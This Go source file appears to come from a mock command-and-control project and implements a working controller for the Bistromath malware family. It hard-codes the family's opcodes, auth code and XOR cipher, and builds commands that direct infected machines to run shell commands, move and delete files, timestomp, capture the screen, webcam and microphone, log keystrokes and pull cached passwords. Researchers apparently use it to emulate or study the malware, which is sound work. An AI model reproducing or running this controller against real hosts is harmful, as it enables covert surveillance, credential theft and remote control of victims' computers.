package bistromath

import (
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"io/ioutil"
	"os"
	"strconv"
	"strings"

	"megaman.genesis.local/sknight/mockc2/internal/log"
	"megaman.genesis.local/sknight/mockc2/internal/queue"
	"megaman.genesis.local/sknight/mockc2/pkg/protocol"
)

const (
	opBeacon               uint8 = 0x3
	opBeaconResp           uint8 = 0x4
	opDirectoryList        uint8 = 0x5
	opFileUpload           uint8 = 0x7
	opFileUploadResp       uint8 = 0x8
	opFileDownload         uint8 = 0x9
	opFileDownloadData     uint8 = 0xa
	opFileCopy             uint8 = 0xb
	opFileMove             uint8 = 0xd
	opFileRename           uint8 = 0xf
	opFileDelete           uint8 = 0x11
	opDirectoryCreate      uint8 = 0x13
	opTimestomp            uint8 = 0x15
	opProcessList          uint8 = 0x17
	opProcessKill          uint8 = 0x19
	opServiceList          uint8 = 0x1b
	opServiceStart         uint8 = 0x1d
	opServiceStop          uint8 = 0x1f
	opCommandPipe          uint8 = 0x21
	opCommandPipeResp      uint8 = 0x22
	opLibraryLoad          uint8 = 0x23
	opLibraryUnload        uint8 = 0x25
	opFileSize             uint8 = 0x28
	opFileDownloadComplete uint8 = 0x2a
	opScreenshot           uint8 = 0x2b
	opMicrophoneCapture    uint8 = 0x2d
	opKeylogger            uint8 = 0x2f
	opBrowserActivity1     uint8 = 0x31
	opCachePassword        uint8 = 0x33
	opDisconnect           uint8 = 0x35
	opBrowserActivity2     uint8 = 0x42
	opError                uint8 = 0x46
	opLogGet               uint8 = 0x50
	opFileDownloadSize     uint8 = 0x53
	opWebcamCapture        uint8 = 0x54
	opUninstall            uint8 = 0x58
	opWindowsList          uint8 = 0x59
)

const authCode = 0x9EBF5072

// Handler is a Bistromath protocol handler capable of communicating with the
// Bistromath malware family.
type Handler struct {
	delegate protocol.Delegate
	dataChan chan byte
	fileName string
	file     *os.File
}

type command struct {
	opcode   uint8
	length   uint32
	unused   uint32
	authCode uint32
	data     []byte
}

// SetDelegate saves the delegate for later use.
func (h *Handler) SetDelegate(delegate protocol.Delegate) {
	h.delegate = delegate
}

// Accept gives the Handler a chance to do something as soon as an agent
// connects.
func (h *Handler) Accept() {
	h.sendVictimInfo()
}

// ReceiveData saves the network data and processes it when a full command has
// been received.
func (h *Handler) ReceiveData(data []byte) {
	log.Debug("received\n" + hex.Dump(data))

	if h.dataChan == nil {
		h.dataChan = make(chan byte, len(data))
		go h.processData()
	}

	queue.Put(h.dataChan, data)
}

// Close cleans up any uzed resources.
func (h *Handler) Close() {
	close(h.dataChan)
}

// NeedsTLS returns whether the protocol runs over TLS or not.
func (h *Handler) NeedsTLS() bool {
	return false
}

// Execute runs a command on the connected agent.
func (h *Handler) Execute(name string, args []string) {
	commandLine := strings.TrimSpace(name + " " + strings.Join(args, " "))

	h.runCmdPipe(commandLine)
}

// Upload sends a file to the connected agent.
func (h *Handler) Upload(source string, destination string) {
	h.uploadFile(source, destination)
}

// Download retrieves a file from the connected agent.
func (h *Handler) Download(source string, destination string) {
	h.fileName = destination
	h.downloadFile(source)
}

func (h *Handler) processData() {
	for {
		cmd := command{}

		b, err := queue.Get(h.dataChan, 13)
		if err != nil {
			h.delegate.CloseConnection()
			return
		}

		cmd.opcode = b[0]
		cmd.length = binary.LittleEndian.Uint32(b[1:5])
		cmd.unused = binary.LittleEndian.Uint32(b[5:9])
		cmd.authCode = binary.LittleEndian.Uint32(b[9:13])

		if cmd.length > 0 {
			cmd.data = make([]byte, cmd.length)

			data, err := queue.Get(h.dataChan, int(cmd.length))
			if err != nil {
				h.delegate.CloseConnection()
				return
			}

			data = cipher(data)

			copy(cmd.data, data)
		}

		h.proccessCommand(cmd)
	}
}

func (h *Handler) proccessCommand(cmd command) {
	logCommand(cmd)

	switch cmd.opcode {
	case opBeaconResp:
		hash := sha256.Sum256(cmd.data)
		id := hex.EncodeToString(hash[:])

		h.delegate.AgentConnected(id)
	case opCommandPipeResp:
		log.Info(string(cmd.data))
	case opFileUploadResp:
		log.Success("Upload complete")
	case opFileDownloadSize:
		file, err := os.Create(h.fileName)
		if err != nil {
			log.Warn("Error opening destination file: %v", err)
			return
		}
		h.file = file
	case opFileDownloadData:
		h.file.Write(cmd.data)
	case opFileDownloadComplete:
		h.file.Close()
		h.file = nil
		h.fileName = ""
		log.Success("Download complete")
	case opError:
		if h.file != nil {
			h.file.Close()
		}
		h.file = nil
		h.fileName = ""
		log.Warn(string(cmd.data))
	}
}

func logCommand(c command) {
	log.Debug("Bistromath Command")
	log.Debug("Opcode: 0x%x", c.opcode)
	log.Debug("Length: 0x%x", c.length)
	log.Debug("Unused: 0x%04x", c.unused)
	log.Debug("  Auth: 0x%04x", c.authCode)
	log.Debug("  Data:\n%s", hex.Dump(c.data))
}

func (h *Handler) sendData(c command) error {
	result := make([]byte, 13+len(c.data))

	result[0] = c.opcode
	binary.LittleEndian.PutUint32(result[1:5], c.length)
	binary.LittleEndian.PutUint32(result[5:9], c.unused)
	binary.LittleEndian.PutUint32(result[9:13], c.authCode)

	if c.length > 0 {
		encrypted := cipher(c.data)
		copy(result[13:], encrypted)
	}

	h.delegate.SendData(result)

	return nil
}

func cipher(input []byte) []byte {
	output := make([]byte, len(input))

	var key byte = 0x77

	for i := 0; i < len(input); i++ {
		output[i] = (input[i] ^ key) & 0xff
	}

	return output
}

func (h *Handler) sendVictimInfo() {
	var data []byte

	cmd := command{}
	cmd.opcode = opBeacon
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) listDrives() {
	var data []byte

	cmd := command{}
	cmd.opcode = opDirectoryList
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) directoryList(path string) {
	var data []byte

	data = append([]byte(path), 0x00)

	cmd := command{}
	cmd.opcode = opDirectoryList
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) uploadFile(src string, dst string) {
	b, err := ioutil.ReadFile(src)
	if err != nil {
		log.Warn("Error opening source file: %v", err)
		return
	}

	var data []byte

	data = append([]byte(dst), 0x00)
	data = append(data, b...)

	cmd := command{}
	cmd.opcode = opFileUpload
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) downloadFile(src string) {
	var data []byte

	data = append([]byte(src), 0x00)

	cmd := command{}
	cmd.opcode = opFileDownload
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) copyFile(src string, directory string) {
	var data []byte

	data = append([]byte(src+";"+directory), 0x00)

	cmd := command{}
	cmd.opcode = opFileCopy
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) moveFile(src string, directory string) {
	var data []byte

	data = append([]byte(src+";"+directory), 0x00)

	cmd := command{}
	cmd.opcode = opFileMove
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) renameFile(src string, dst string) {
	var data []byte

	data = append([]byte(src+";"+dst), 0x00)

	cmd := command{}
	cmd.opcode = opFileRename
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) deleteFile(src string) {
	var data []byte

	data = append([]byte(src), 0x00)

	cmd := command{}
	cmd.opcode = opFileDelete
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) createDirectory(directory string) {
	var data []byte

	data = append([]byte(directory), 0x00)

	cmd := command{}
	cmd.opcode = opDirectoryCreate
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) timestomp(src string) {
	var data []byte

	data = append([]byte(src), 0x00)

	cmd := command{}
	cmd.opcode = opTimestomp
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) processList() {
	var data []byte

	cmd := command{}
	cmd.opcode = opProcessList
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) killProcess(pid int) {
	var data []byte

	data = append([]byte(strconv.Itoa(pid)), 0x00)

	cmd := command{}
	cmd.opcode = opProcessKill
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) serviceList() {
	var data []byte

	cmd := command{}
	cmd.opcode = opServiceList
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) startService(serviceName string) {
	var data []byte

	data = append([]byte(serviceName), 0x00)

	cmd := command{}
	cmd.opcode = opServiceStart
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) stopService(serviceName string) {
	var data []byte

	data = append([]byte(serviceName), 0x00)

	cmd := command{}
	cmd.opcode = opServiceStop
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) runCmdPipe(input string) {
	var data []byte

	data = append([]byte(input), 0x00)

	cmd := command{}
	cmd.opcode = opCommandPipe
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) loadLibrary(library string) {
	var data []byte

	data = append([]byte(library), 0x00)

	cmd := command{}
	cmd.opcode = opLibraryLoad
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) unloadLibrary(library string) {
	var data []byte

	data = append([]byte(library), 0x00)

	cmd := command{}
	cmd.opcode = opLibraryUnload
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) getFileSize(file string) {
	var data []byte

	data = append([]byte(file), 0x00)

	cmd := command{}
	cmd.opcode = opFileSize
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) getScreenshot() {
	var data []byte

	cmd := command{}
	cmd.opcode = opScreenshot
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) microphoneCapture(input string) {
	var data []byte

	data = append([]byte(input), 0x00)

	cmd := command{}
	cmd.opcode = opMicrophoneCapture
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) keyLogger(input string) {
	var data []byte

	data = append([]byte(input), 0x00)

	cmd := command{}
	cmd.opcode = opKeylogger
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) browserActivity(input string) {
	var data []byte

	if input != "" {
		data = append([]byte(input), 0x00)
	}

	cmd := command{}
	if input != "" {
		cmd.opcode = opBrowserActivity1
	} else {
		cmd.opcode = opBrowserActivity2
	}
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) cachePassword(input string) {
	var data []byte

	data = append([]byte(input), 0x00)

	cmd := command{}
	cmd.opcode = opCachePassword
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) disconnect() {
	var data []byte

	cmd := command{}
	cmd.opcode = opDisconnect
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) getLog() {
	var data []byte

	cmd := command{}
	cmd.opcode = opLogGet
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) webcamCapture(input string) {
	var data []byte

	data = append([]byte(input), 0x00)

	cmd := command{}
	cmd.opcode = opWebcamCapture
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) uninstall() {
	var data []byte

	cmd := command{}
	cmd.opcode = opUninstall
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}

func (h *Handler) listOpenWindows() {
	var data []byte

	cmd := command{}
	cmd.opcode = opWindowsList
	cmd.length = uint32(len(data))
	cmd.unused = 0x0
	cmd.authCode = authCode
	cmd.data = data
	h.sendData(cmd)
}
